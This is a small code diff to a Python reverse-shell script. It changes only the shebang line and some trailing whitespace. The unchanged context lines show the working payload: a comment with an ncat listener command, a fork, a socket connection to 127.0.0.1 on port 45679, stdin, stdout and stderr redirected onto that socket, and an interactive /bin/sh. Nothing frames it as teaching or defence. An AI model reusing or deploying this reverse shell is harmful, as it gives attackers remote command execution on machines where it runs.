@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 
 #ncat -l -v -p 45679
 
@@ -16,7 +16,7 @@ except OSError as error:
     pid = os.fork()
     if pid > 0:
         print('Fork Not Valid!')
-        
+
 socket_handler.connect(("127.0.0.1", 45679))
 
 os.dup2(socket_handler.fileno(),0)
@@ -25,5 +25,3 @@ os.dup2(socket_handler.fileno(),2)
 
 shell_remote = subprocess.call(["/bin/sh", "-i"])
 list_files = subprocess.call(["/bin/ls", "-i"])
-
-
